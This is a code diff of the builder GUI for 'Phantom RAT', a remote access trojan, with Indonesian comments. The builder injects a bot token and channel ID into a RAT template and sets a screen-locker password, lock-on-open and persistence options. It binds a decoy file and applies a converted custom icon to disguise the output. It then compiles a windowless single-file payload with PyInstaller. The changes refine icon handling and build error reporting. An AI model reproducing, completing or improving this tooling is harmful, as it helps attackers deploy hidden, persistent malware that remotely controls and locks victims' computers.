@@ -21,7 +21,6 @@ class RATBuilder(ctk.CTk):
         super().__init__()
 
         self.title("PHANTOM RAT BUILDER v6.6")
-        # Layout Compact: Tinggi 720 agar pas di layar laptop/PC tanpa kepotong
         self.geometry("950x720") 
         self.configure(fg_color=DARK_BG)
         self.resizable(False, False)
@@ -30,7 +29,6 @@ class RATBuilder(ctk.CTk):
         self.template_path = os.path.join(self.current_dir, "rat-template.py")
         self.theme_dir = os.path.join(self.current_dir, "theme")
         
-        # Variabel untuk Binder & Icon
         self.binder_file_path = ""
         self.icon_file_path = ""
 
@@ -57,19 +55,15 @@ class RATBuilder(ctk.CTk):
         self.create_label(self.left_col, "🛡️ 2. SECURITY & PERSISTENCE")
         self.pass_entry = self.create_entry(self.left_col, "Locker Password")
 
-        self.lock_mode_var = ctk.StringVar(value="command") # Default: Nunggu perintah
+        self.lock_mode_var = ctk.StringVar(value="command")
 
         radio_frame = ctk.CTkFrame(self.left_col, fg_color="transparent")
         radio_frame.pack(pady=5, padx=20, fill="x")
 
-        self.radio_on_exe = ctk.CTkRadioButton(radio_frame, text="Lock on Open", 
-                                            variable=self.lock_mode_var, value="instant",
-                                            text_color="white", fg_color=NEON_PURPLE)
+        self.radio_on_exe = ctk.CTkRadioButton(radio_frame, text="Lock on Open", variable=self.lock_mode_var, value="instant", text_color="white", fg_color=NEON_PURPLE)
         self.radio_on_exe.pack(side="left", padx=5)
 
-        self.radio_on_cmd = ctk.CTkRadioButton(radio_frame, text="Lock on Command", 
-                                            variable=self.lock_mode_var, value="command",
-                                            text_color="white", fg_color=NEON_PURPLE)
+        self.radio_on_cmd = ctk.CTkRadioButton(radio_frame, text="Lock on Command", variable=self.lock_mode_var, value="command", text_color="white", fg_color=NEON_PURPLE)
         self.radio_on_cmd.pack(side="left", padx=5)
         
         check_frame = ctk.CTkFrame(self.left_col, fg_color="transparent")
@@ -82,16 +76,12 @@ class RATBuilder(ctk.CTk):
         # --- FILE BINDER & ICON SECTION ---
         self.create_label(self.left_col, "🖇️ 3. FILE BINDER & ICON")
         
-        self.btn_binder = ctk.CTkButton(self.left_col, text="📁 Select File to Bind", 
-                                        fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1,
-                                        command=self.select_binder_file)
+        self.btn_binder = ctk.CTkButton(self.left_col, text="📁 Select File to Bind", fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1, command=self.select_binder_file)
         self.btn_binder.pack(pady=5, padx=20, fill="x")
         self.binder_label = ctk.CTkLabel(self.left_col, text="No file bound", font=("Consolas", 10), text_color="#777")
         self.binder_label.pack(padx=20)
 
-        self.btn_icon = ctk.CTkButton(self.left_col, text="🎨 Select Icon (.ico)", 
-                                      fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1,
-                                      command=self.select_icon_file)
+        self.btn_icon = ctk.CTkButton(self.left_col, text="🎨 Select Icon (IMG/ICO)", fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1, command=self.select_icon_file)
         self.btn_icon.pack(pady=5, padx=20, fill="x")
         self.icon_label = ctk.CTkLabel(self.left_col, text="Default Icon", font=("Consolas", 10), text_color="#777")
         self.icon_label.pack(padx=20)
@@ -113,7 +103,6 @@ class RATBuilder(ctk.CTk):
         self.log_box = ctk.CTkTextbox(self.right_col, height=120, fg_color=DARK_BG, text_color=NEON_GREEN, font=("Consolas", 11))
         self.log_box.pack(pady=(5, 10), padx=20, fill="both", expand=True)
 
-        # Stats Panel
         self.stats_frame = ctk.CTkFrame(self.right_col, fg_color="#0d0d0d", height=40)
         self.stats_frame.pack(fill="x", padx=20, pady=(0, 10))
         self.entropy_lbl = ctk.CTkLabel(self.stats_frame, text="ENTROPY: 0.00", font=("Consolas", 10), text_color="#777")
@@ -122,18 +111,15 @@ class RATBuilder(ctk.CTk):
         self.fud_status.pack(side="right", padx=10)
 
         # --- BUILD BUTTON ---
-        self.build_btn = ctk.CTkButton(self, text="🚀 INITIALIZE GENERATION", fg_color=NEON_GREEN, text_color="black",
-                                       font=("Orbitron", 18, "bold"), height=55, command=self.start_build_thread)
+        self.build_btn = ctk.CTkButton(self, text="🚀 INITIALIZE GENERATION", fg_color=NEON_GREEN, text_color="black", font=("Orbitron", 18, "bold"), height=55, command=self.start_build_thread)
         self.build_btn.pack(pady=(10, 10), padx=20, fill="x")
 
-        # --- ANIMATION & FOOTER ---
         self.footer = ctk.CTkLabel(self, text=f"SYSTEM: {platform.system()} | USER: {os.getlogin()} | STATUS: READY", font=("Consolas", 9), text_color="#555")
         self.footer.pack(pady=(0, 5))
 
-        # Start Header Animation
         threading.Thread(target=self.animate_ui, daemon=True).start()
 
-    # --- ANIMATION LOGIC ---
+    # --- ANIMATION ---
     def animate_ui(self):
         colors = [NEON_PURPLE, "#ffffff", NEON_PURPLE, NEON_GREEN]
         while True:
@@ -143,18 +129,24 @@ class RATBuilder(ctk.CTk):
                 self.entropy_lbl.configure(text=f"ENTROPY: {val:.2f}")
                 time.sleep(0.8)
 
-    # --- FUNCTIONS ---
+    # --- UPDATED SELECTORS WITH CANCEL LOGIC ---
     def select_binder_file(self):
         path = filedialog.askopenfilename(title="Select File to Bind")
         if path:
             self.binder_file_path = path
             self.binder_label.configure(text=f"Bound: {os.path.basename(path)}", text_color=NEON_GREEN)
+        else:
+            self.binder_file_path = ""
+            self.binder_label.configure(text="Binder Selection Cancelled", text_color="red")
 
     def select_icon_file(self):
-        path = filedialog.askopenfilename(title="Select Icon", filetypes=[("Icon Files", "*.ico")])
+        path = filedialog.askopenfilename(title="Select Icon", filetypes=[("Image Files", "*.ico *.png *.jpg *.jpeg")])
         if path:
             self.icon_file_path = path
-            self.icon_label.configure(text=f"Icon: {os.path.basename(path)}", text_color=NEON_GREEN)
+            self.icon_label.configure(text=f"Selected: {os.path.basename(path)}", text_color=NEON_GREEN)
+        else:
+            self.icon_file_path = ""
+            self.icon_label.configure(text="Icon Selection Cancelled", text_color="red")
 
     def get_theme_list(self):
         if not os.path.exists(self.theme_dir): return []
@@ -187,24 +179,38 @@ class RATBuilder(ctk.CTk):
 
     def execute_generation(self):
         self.build_btn.configure(state="disabled", text="🔨 COMPILING...")
+        temp_icon_created = False
+        final_icon_path = ""
+        
         try:
             self.log("Initializing Phantom Engine...")
             token = self.token_entry.get()
             channel = self.channel_entry.get()
-            lock_mode = self.lock_mode_var.get()
             if not token or not channel: raise Exception("Gateway Credentials Missing")
 
-            # Encode Assets
+            # --- PROTEKSI ICON (Gunakan Path Absolut) ---
+            if self.icon_file_path:
+                try:
+                    self.log("Refining icon path...")
+                    # Simpan temp_icon di folder yang sama dengan script agar terbaca compiler
+                    final_icon_path = os.path.abspath(os.path.join(self.current_dir, "build_icon.ico"))
+                    img = Image.open(self.icon_file_path)
+                    icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
+                    img.save(final_icon_path, format='ICO', sizes=icon_sizes)
+                    temp_icon_created = True
+                except Exception as e:
+                    self.log(f"Icon process failed: {e}")
+                    final_icon_path = ""
+
+            # --- PROSES TEMPLATE (Sama seperti kemarin) ---
+            with open(self.template_path, "r", encoding="utf-8") as f: 
+                code = f.read()
+
             b64_img = file_to_base64(os.path.join(self.theme_dir, self.theme_var.get()))
             b64_binder = file_to_base64(self.binder_file_path) if self.binder_file_path else ""
             binder_name = os.path.basename(self.binder_file_path) if self.binder_file_path else "NONE"
 
-            with open(self.template_path, "r", encoding="utf-8") as f: 
-                code = f.read()
-
             is_lock_instant = "True" if self.lock_mode_var.get() == "instant" else "False"
-
-            # Injection Logic
             code = code.replace('TOKEN = "YOUR_BOT_TOKEN"', f'TOKEN = "{token}"')
             code = code.replace('MY_CHANNEL_ID = YOUR_CHANNEL_ID_INT', f'MY_CHANNEL_ID = {channel}')
             code = code.replace('GAMBAR_BASE64 = "BG_IMAGE_DATA"', f'GAMBAR_BASE64 = "{b64_img}"')
@@ -214,25 +220,38 @@ class RATBuilder(ctk.CTk):
             code = code.replace('LOCK_ON_START = False', f'LOCK_ON_START = {is_lock_instant}')
             code = code.replace('PERSISTENCE_ENABLED = False', f'PERSISTENCE_ENABLED = {"True" if self.persist_mode.get() else "False"}')
 
-            dist_folder = os.path.join(self.current_dir, "dist")
+            dist_folder = os.path.abspath(os.path.join(self.current_dir, "dist"))
             py_final = os.path.join(dist_folder, "stub_ready.py")
             if not os.path.exists(dist_folder): os.makedirs(dist_folder)
             with open(py_final, "w", encoding="utf-8") as f: f.write(code)
 
-            # PyInstaller Command with Icon Support
             self.log("Launching Compiler Engine...")
-            cmd = f'"{sys.executable}" -m PyInstaller --noconsole --onefile --clean --noconfirm --distpath "{dist_folder}" --name "PhantomRAT"'
-            if self.icon_file_path: cmd += f' --icon "{self.icon_file_path}"'
-            cmd += f' "{py_final}"'
+
+            # --- KEMBALI KE FORMAT STRING (Yang kemarin bisa) ---
+            # Kita pakai format string tunggal lagi, tapi icon dipaksa absolut
+            base_cmd = f'"{sys.executable}" -m PyInstaller --noconsole --onefile --clean --noconfirm --distpath "{dist_folder}" --name "PhantomRAT"'
             
-            subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
-            self.log("BUILD COMPLETED! Saved in /dist")
-            messagebox.showinfo("Success", "Payload generated successfully!")
+            if final_icon_path and os.path.exists(final_icon_path):
+                base_cmd += f' --icon="{final_icon_path}"'
+            
+            full_cmd = f'{base_cmd} "{py_final}"'
+            
+            # Jalankan dengan shell=True seperti yang sebelumnya jalan
+            process = subprocess.run(full_cmd, shell=True, capture_output=True, creationflags=0x08000000)
+            
+            if process.returncode == 0:
+                self.log("BUILD SUCCESSFUL!")
+                messagebox.showinfo("Success", "Payload generated successfully!")
+            else:
+                err = process.stderr.decode('utf-8', errors='ignore')
+                self.log(f"BUILD FAILED: {err[:50]}...")
+                print(f"FULL ERROR:\n{err}")
 
         except Exception as e:
             self.log(f"CRITICAL ERROR: {str(e)}")
             messagebox.showerror("Build Error", str(e))
         
+            
         self.build_btn.configure(state="normal", text="🚀 INITIALIZE GENERATION")
 
 if __name__ == "__main__":
